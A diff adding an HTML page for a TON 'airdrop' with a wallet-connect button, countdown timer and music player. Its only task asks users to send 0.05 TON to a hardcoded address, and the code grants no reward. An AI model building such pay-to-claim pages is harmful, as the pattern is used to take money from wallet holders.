@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TON Airdrop with Song Bar</title>
+  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+  <style>
+    body {
+      margin: 0;
+      background-color: #000;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      overflow: hidden;
+    }
+
+    #ton-connect {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      z-index: 9999;
+    }
+
+    .coin-container {
+      position: relative;
+      width: 120px;
+      height: 120px;
+      margin: 50px auto 10px;
+    }
+
+    .coin-image {
+      width: 100%;
+      height: 100%;
+      background: url('coin.png') no-repeat center center / cover;
+      border-radius: 50%;
+      position: absolute;
+      z-index: 2;
+    }
+
+    .glow-effect {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(255, 223, 0, 0.5), transparent);
+      animation: glow-spin 3s linear infinite;
+      z-index: 1;
+      filter: blur(10px);
+    }
+
+    .airdrop-item {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 15px;
+      margin: 10px auto;
+      border-radius: 10px;
+      max-width: 80%;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .airdrop-logo {
+      width: 50px;
+      height: 50px;
+      background: url('coin.png') no-repeat center center / cover;
+      border-radius: 50%;
+      margin-right: 20px;
+    }
+
+    .airdrop-content {
+      flex-grow: 1;
+      text-align: left;
+    }
+
+    .airdrop-button {
+      padding: 10px 20px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .airdrop-button:hover {
+      background-color: #45a049;
+    }
+
+    .airdrop-button.disabled {
+      background-color: gray;
+      cursor: not-allowed;
+    }
+
+    .countdown {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin: 20px auto 10px;
+    }
+
+    .countdown-box {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 5px 10px;
+      border-radius: 5px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    .countdown-box span {
+      display: block;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    .song-bar {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 15px;
+      margin: 10px auto;
+      border-radius: 10px;
+      max-width: 90%;
+    }
+
+    .song-bar button {
+      padding: 10px;
+      margin: 5px;
+      background-color: #1c1c1c;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .song-bar button:hover {
+      background-color: #333;
+    }
+
+    audio {
+      width: 100%;
+      margin-top: 10px;
+    }
+
+    .nav-bar {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      display: flex;
+      justify-content: space-around;
+      background-color: #1c1c1c;
+      padding: 10px 0;
+    }
+
+    .nav-bar button {
+      width: 50px;
+      height: 50px;
+      background-color: black;
+      border: none;
+      border-radius: 50%;
+      background-size: cover;
+      background-position: center;
+      cursor: pointer;
+    }
+
+    .nav-bar button:focus {
+      outline: 2px solid white;
+    }
+
+    .nav-bar button.home {
+      background-image: url('home.png');
+    }
+
+    .nav-bar button.leader {
+      background-image: url('leader.png');
+    }
+
+    
+
+    .nav-bar button.airdrop {
+      background-image: url('airdrop.png');
+    }
+  </style>
+</head>
+<body>
+  <!-- TON Connect Button -->
+  <div id="ton-connect"></div>
+
+  <!-- Glowing Coin -->
+  <div class="coin-container">
+    <div class="coin-image"></div>
+    <div class="glow-effect"></div>
+  </div>
+
+  <!-- Airdrop Item 1 -->
+  <div class="airdrop-item">
+    <div class="airdrop-logo"></div>
+    <div class="airdrop-content">Complete 0.05 TON Transaction</div>
+    <button class="airdrop-button" id="airdrop-start">Start</button>
+  </div>
+
+  <!-- Countdown Timer -->
+  <div class="countdown">
+    <div class="countdown-box">
+      <span id="months">00</span>Mon
+    </div>
+    <div class="countdown-box">
+      <span id="days">00</span>Day
+    </div>
+    <div class="countdown-box">
+      <span id="hours">00</span>Hr
+    </div>
+    <div class="countdown-box">
+      <span id="minutes">00</span>Min
+    </div>
+    <div class="countdown-box">
+      <span id="seconds">00</span>Sec
+    </div>
+  </div>
+
+  <!-- Song Bar -->
+  <div class="song-bar">
+    <button id="prev-song">Previous</button>
+    <button id="next-song">Next</button>
+    <audio id="audio-player" controls></audio>
+  </div>
+
+  <!-- Navigation Bar -->
+  <div class="nav-bar">
+    <button class="home" onclick="window.location.href='home.html'"></button>
+    <button class="leader" onclick="window.location.href='leader.html'"></button>
+   
+    <button class="airdrop" onclick="window.location.href='airdrop.html'"></button>
+  </div>
+
+  <script>
+    // TON Connect UI Initialization
+    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+      manifestUrl: 'https://abu09127abu.github.io/Ab-coin-tast-/tonconnect-manifest.json',
+      buttonRootId: 'ton-connect'
+    });
+
+    // Countdown Timer
+    const countdown = () => {
+      const targetDate = new Date("February 26, 2025 00:00:00").getTime();
+      const now = new Date().getTime();
+      const difference = targetDate - now;
+
+      if (difference < 0) return;
+
+      const months = Math.floor(difference / (1000 * 60 * 60 * 24 * 30));
+      const days = Math.floor((difference % (1000 * 60 * 60 * 24 * 30)) / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((difference % (1000 * 60)) / 1000);
+
+      document.getElementById("months").textContent = months.toString().padStart(2, "0");
+      document.getElementById("days").textContent = days.toString().padStart(2, "0");
+      document.getElementById("hours").textContent = hours.toString().padStart(2, "0");
+      document.getElementById("minutes").textContent = minutes.toString().padStart(2, "0");
+      document.getElementById("seconds").textContent = seconds.toString().padStart(2, "0");
+    };
+
+    setInterval(countdown, 1000);
+
+    // Transaction Completion
+    const startButton = document.getElementById("airdrop-start");
+    startButton.addEventListener("click", async () => {
+      try {
+        const transaction = {
+          messages: [
+            {
+              address: "EQCI4do2VFDFGroecTPtKeDHpkP9hlA2ZeZfNpmqDtYACv_B",
+              amount: "50000000"
+            }
+          ]
+        };
+
+        await tonConnectUI.sendTransaction(transaction);
+        localStorage.setItem("transactionComplete", "true");
+        startButton.textContent = "Complete";
+        startButton.classList.add("disabled");
+      } catch (error) {
+        console.error("Transaction failed", error);
+      }
+    });
+
+    if (localStorage.getItem("transactionComplete") === "true") {
+      startButton.textContent = "Complete";
+      startButton.classList.add("disabled");
+    }
+
+    // Song Bar Logic
+    const audioPlayer = document.getElementById("audio-player");
+    const songs = Array.from({ length: 10000 }, (_, i) => `${i + 1}.mp3`);
+    let currentSongIndex = 0;
+
+    const updateSong = () => {
+      audioPlayer.src = songs[currentSongIndex];
+      audioPlayer.play();
+    };
+    
+
+
+    document.getElementById("prev-song").addEventListener("click", () => {
+      currentSongIndex = (currentSongIndex - 1 + songs.length) % songs.length;
+      updateSong();
+    });
+
+    document.getElementById("next-song").addEventListener("click", () => {
+      currentSongIndex = (currentSongIndex + 1) % songs.length;
+      updateSong();
+    });
+
+    updateSong(); // Initialize the first song
+  </script>
+</body>
+</html>
